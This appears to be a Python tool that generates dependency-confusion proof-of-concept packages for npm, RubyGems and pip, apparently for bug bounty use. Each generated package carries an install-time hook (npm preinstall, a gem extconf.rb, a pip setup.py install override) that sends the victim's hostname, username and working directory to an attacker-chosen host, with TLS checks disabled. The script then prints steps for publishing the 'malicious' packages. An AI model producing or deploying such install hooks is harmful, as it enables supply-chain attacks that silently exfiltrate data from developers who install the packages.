import json
import os


def generate_poc_directory(name: str):
    try:
        os.mkdir(f'./{name}')
    except:
        print(f"Just warning: Path already exist or user haven't got write permission ('{name}' directory creation)")
    try:
        os.mkdir(f'./{name}/gem')
    except:
        print(
            f"Just warning: Path already exist or user haven't got write permission ('{name}/gem' directory creation)")
    try:
        os.mkdir(f'./{name}/npm')
    except:
        print(
            f"Just warning: Path already exist or user haven't got write permission ('{name}/npm' directory creation)")
    try:
        os.mkdir(f'./{name}/pip')
    except:
        print(
            f"Just warning: Path already exist or user haven't got write permission ('{name}/pip' directory creation)")


def generate_gem_poc(name: str, host_ip: str, port: int, ssl_enabled: bool):
    try:
        os.makedirs(f'./{name}/gem/ext/{name}')
    except:
        print(
            f"Just warning: Path already exist or user haven't got write permission ('./{name}/gem/ext/{name}' directory creation)")
    try:
        os.mkdir(f'./{name}/gem/lib')
    except:
        print(
            f"Just warning: Path already exist or user haven't got write permission ('./{name}/gem/lib' directory creation)")

    gemspec = f"""
Gem::Specification.new do |s|
    s.name        = "{name}"
    s.version     = "1337.13.69"
    s.summary     = "{name}"
    s.description = "PoC for potential RCE generated by my program"
    s.authors     = ["ExZuperi"]
    s.email       = "exzuperi.cyber@gmail.com"
    s.files       = ["lib/{name}.rb"]
    s.homepage    =
      "https://rubygems.org/gems/{name}"
    s.license       = "MIT"
    s.extensions << 'ext/{name}/extconf.rb'
end"""
    with open(f'{name}/gem/{name}.gemspec', 'w') as f:
        f.write(gemspec)

    if ssl_enabled:
        extconf = f"""
require 'net/http'
require 'json'
require 'openssl'

hostname = Socket.gethostname
user = ENV['USER']
pwd = ENV['PWD']
package_name = "{name}"

# Create the JSON data
data = {{
  "hostname" => hostname,
  "pwd" => pwd,
  "user" => user,
  "package_name" => package_name
}}.to_json

# Send the POST request
uri = URI('https://{host_ip}:{port}/PoC')
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true
http.ssl_version = :TLSv1_2
http.verify_mode = OpenSSL::SSL::VERIFY_NONE

request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json')
request.body = data

response = http.request(request)

require 'mkmf'
create_makefile('hello_c')
    """
    else:
        extconf = f"""
require 'net/http'
require 'json'
require 'openssl'

hostname = Socket.gethostname
user = ENV['USER']
pwd = ENV['PWD']
package_name = "{name}"

# Create the JSON data
data = {{
  "hostname" => hostname,
  "pwd" => pwd,
  "user" => user,
  "package_name" => package_name
}}.to_json

# Send the POST request
uri = URI('http://{host_ip}:{port}/PoC')
http = Net::HTTP.new(uri.host, uri.port)
#http.use_ssl = true
#http.ssl_version = :TLSv1_2
#http.verify_mode = OpenSSL::SSL::VERIFY_NONE

request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json')
request.body = data

response = http.request(request)

require 'mkmf'
create_makefile('hello_c')

"""
    with open(f'{name}/gem/ext/{name}/extconf.rb', 'w') as f:
        f.write(extconf)

    helloworld_c = """
#include <stdio.h>
#include "ruby.h"

VALUE world(VALUE self) {
  printf("Hello World!\n");
  return Qnil;
}


void Init_hello_c() {
  printf("Hello World!\n");
  VALUE HelloC = rb_define_module("HelloC");
  rb_define_singleton_method(HelloC, "world", world, 0);
}
"""
    with open(f'{name}/gem/ext/{name}/hello.c', 'w') as f:
        f.write(helloworld_c)

    libfile = f"""
class {name}
    def self.hi
      puts "Thanks for BugBounty cooperation!"
    end
end
"""
    with open(f'{name}/gem/lib/{name}.rb', 'w') as f:
        f.write(libfile)
    print("\nGEM code was generated. Thanks!")
    print("What should I do next?")
    print(f"cd {name}/gem/ && gem build {name}.gemspec")
    print("Now you can publish your malicious .gem!")


def generate_pip_poc(name: str, host_ip: str, port: int, ssl_enabled: bool):
    try:
        os.makedirs(f'./{name}/pip/src/{name}')
    except:
        print(
            f"Just warning: Path already exist or user haven't got write permission ('{name}/pip/src/{name}' directory creation)")

    link = f"https://{host_ip}:{port}/PoC" if ssl_enabled else f"http://{host_ip}:{port}/PoC"
    setup = f"""
from setuptools import setup, find_packages
from setuptools.command.install import install
import socket
import os


def send_poc():
    hostname = socket.gethostname()
    current_directory = os.getcwd()
    username = os.getlogin()
    os.system(f\"\"\"
    curl -k --header "Content-Type: application/json" \\
  --request POST \\
  --data '{{{{"hostname":"{{hostname}}","pwd":"{{current_directory}}", "user":"{{username}}", "package_name":"{name}"}}}}' \\
  {link}\"\"\")


class RunArbitraryCode(install):
    def run(self):
        send_poc()
        install.run(self)


setup(
    name='{name}',
    version='1337.13.69',
    license="MIT",
    packages=find_packages(),
    install_requires=[
        'requests',
        'setuptools'
    ],
    cmdclass={{
        'install': RunArbitraryCode,
    }},
)
"""
    with open(f'{name}/pip/setup.py', 'w') as f:
        f.write(setup)

    license = """
Copyright 2024 Sergey Lezhnin aka ExZuperi

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
    """
    with open(f'{name}/pip/LICENSE', 'w') as f:
        f.write(license)

    READMEmd = """I'm baby hecker"""
    with open(f'{name}/pip/README.md', 'w') as f:
        f.write(READMEmd)
    init = """"""
    with open(f'{name}/pip/src/{name}/__init__.py', 'w') as f:
        f.write(init)
    main = """def make_dep():
    print("Dep")"""
    with open(f'{name}/pip/src/{name}/main.py', 'w') as f:
        f.write(main)

    print("\nPIP code was generated. Thanks!")
    print("What should I do next?")
    print(f"cd {name}/pip/ && pip install twine && python3 -m build")
    print("Now you can publish your malicious dist/*.tar.gz!")
    print("DON'T PUBLISH *.whl FILE. THEY ARE NOT VULNERABLE")




def generate_npm_poc(name: str, host_ip: str, port: int, ssl_enabled: bool):
    if ssl_enabled:
        required = f"""
const os = require('os');
const https = require('https');
const querystring = require('querystring');
const fs = require('fs');
const packageJSON = require('./package.json');
const package_name = packageJSON.name;
"""

        request = f"""
const req = https.request(options, (res) => {{
  res.on('data', (d) => {{
    //console.log(d);
  }});
}});

req.on('error', (e) => {{
  //console.error(e);
}});

req.write(postData);
req.end();
    """
    else:
        required = f"""
const os = require('os');
const http = require('http');
const querystring = require('querystring');
const fs = require('fs');
const packageJSON = require('./package.json');
const package_name = packageJSON.name;
        """

        request = f"""
const req = http.request(options, (res) => {{
  res.on('data', (d) => {{
    //console.log(d);
  }});
}});

req.on('error', (e) => {{
  //console.error(e);
}});

req.write(postData);
req.end();
"""

    tracking_data = f"""
const trackingData = {{
  hostname: os.hostname(),
  pwd: __dirname,
  user: os.userInfo().username,
  package_name: packageJSON.name,
}};
"""
    post_data = f"""
const postData = JSON.stringify(trackingData);
"""
    options = f"""
const options = {{
  hostname: "{host_ip}",
  port: {port},
  path: '/PoC',
  method: 'POST',
  headers: {{
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(postData),
  }},
  rejectUnauthorized: false,
  timeout: 2000,
}};
"""
    code = f"""
{required}
{tracking_data}
{post_data}
{options}
{request}
    """

    with open(f'{name}/npm/index.js', 'w') as f:
        f.write(code)

    package_json = {
        "name": name,
        "version": "1337.13.69",
        "main": "index.js",
        "scripts": {
            "preinstall": "node index.js"
        },
        "license": "ISC"
    }

    with open(f'{name}/npm/package.json', 'w') as f:
        json.dump(package_json, f, indent=2)

    print("\nNPM code was generated. Thanks!")
    print("What should I do next?")
    print(f"cd {name}/npm/ && npm login")
    print("After your login, you can execute 'npm publish'. That's all!")


def generate_packets_of_shit(name: str, host_ip: str, port: int, ssl_enabled: bool):
    generate_poc_directory(name)
    generate_npm_poc(name, host_ip, port, ssl_enabled)
    generate_gem_poc(name, host_ip, port, ssl_enabled)
    generate_pip_poc(name, host_ip, port, ssl_enabled)
